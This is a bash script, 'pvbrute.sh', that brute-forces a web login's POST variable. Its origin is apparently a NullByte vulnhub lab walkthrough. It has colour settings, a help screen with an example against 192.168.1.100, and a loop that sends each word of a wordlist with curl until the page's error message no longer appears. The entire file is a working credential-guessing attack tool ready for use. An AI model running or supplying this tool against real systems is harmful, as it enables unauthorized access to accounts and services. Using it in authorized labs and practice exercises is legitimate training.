#!/bin/bash
#pvbrute.sh v0.1
#last edit 27-04-2015 20:00
#post variable bruteforcer
#all credits to original author
#edit by TAPE
#						TEH COLORZ
########################################################################
STD=$(echo -e "\e[0;0;0m")		#Revert fonts to standard colour/format
RED=$(echo -e "\e[1;31m")		#Alter fonts to red bold
REDN=$(echo -e "\e[0;31m")		#Alter fonts to red normal
GRN=$(echo -e "\e[1;32m")		#Alter fonts to green bold
GRNN=$(echo -e "\e[0;32m")		#Alter fonts to green normal
BLU=$(echo -e "\e[1;36m")		#Alter fonts to blue bold
BLUN=$(echo -e "\e[0;36m")		#Alter fonts to blue normal
#
#						VARIABLES
########################################################################
COLORZ=1
VERBOSE=0
TUNE=/usr/share/sounds/freedesktop/stereo/phone-incoming-call.oga
#
#						HEADER
########################################################################
f_header() {
echo "            ___.                 __          
_________  _\_ |_________ __ ___/  |_  ____  
\____ \  \/ /| __ \_  __ \  |  \   __\/ __ \ 
|  |_> >   / | \_\ \  | \/  |  /|  | \  ___/ 
|   __/ \_/  |___  /__|  |____/ |__|  \___  >
|__|             \/                       \/ 
Post Variable Bruteforcer"
}
#
#						HELP
########################################################################
f_help() {
clear
f_header
echo "
Script originally from @xerubus' script used for NullByte vulnhub walkthrough
all credit to the original author; http://www.mogozobo.com/?p=2724

Usage;
Make sure you check the response when incorrect info is provided
so that the 'error' variable can be correctly set!
> Check the error message on incorrect login attempt for <ERROR> variable
> Check the name of the post variable for <POST VARIABLE> variable
./$0 -u <URL> -p <POST VARIABLE> -e <ERROR> -w <WORDLIST>

Options;
-b  -- boring output with no colours ;)
-e  -- error message on incorrect login   [required]
-h  -- this help information
-p  -- post variable to check wordlist on [required]
-u  -- the login URL <required>           [required]
-w  -- wordlist                           [required]
"
echo 'example: ./pvbrute.sh -u 192.168.1.100/index.php -p key -e "invalid key" -w wordlist.txt'
exit
}
#
#						OPTION FUNCTIONS
########################################################################
while getopts ":be:hp:u:w:" opt; do
  case $opt in
	b) COLORZ=0 ;;
	e) ERROR=$OPTARG ;;
	h) f_help ;;
	p) POSTVAR=$OPTARG ;;
	u) URL=$OPTARG ;;
	w) WORDLIST=$OPTARG ;;
  esac
done
#
#						INPUT CHECKS
########################################################################
if [ $# -eq 0 ] ; then f_help ; fi
# Colour to be or not to be
if [ "$COLORZ" == "0" ] ; then
read RED REDN GRN GRNN ORN ORNN BLU BLUN  <<< ""
fi
#

#							RECAP
########################################################################
echo $STD"-------------------------------"
echo $BLU"POST VARIABLE BRUTEFORCE ATTACK"
echo $STD"-------------------------------"
echo $STD"Bruteforcing URL       : $BLUN$URL$STD"
echo $STD"Checking post variable : $BLUN$POSTVAR$STD"
echo $STD"Checking error message : $BLUN$ERROR$STD"
echo $STD"Using wordlist         : $BLUN$WORDLIST$STD"
#
while read word ; do
echo -ne $STD"Testing possible key   : $REDN$word\r$STD"
	CCOUNT=$(echo $word | wc -c)
	OUTPUT=$(curl -s -d "$POSTVAR=$word" $URL)
	RESULT=$(echo "$OUTPUT" | grep "$ERROR")	# !check correct error to grep for!
	if [[ $RESULT == "" ]] ; then
		echo $GRNN"Found key for variable : $GRN$word$STD"
		if [ "$SOUND" == "ON" ] ; then paplay "$TUNE" ; fi
		break
	else
	SPACE=$(head -c $CCOUNT < /dev/zero | tr '\0' '\040')
	echo -ne $STD"Testing possible key   : $SPACE\r"
	fi
done < "$WORDLIST"
exit
#
#
#Stumbled on this script when reading a vulnhub walkthrough, liked it and decided to prettify it.. :D
#all credit to original author.
#BrutePostVar.sh - A simple post variable brute forcer
#Author=@xerubus
#edit by TAPE
# The End :)
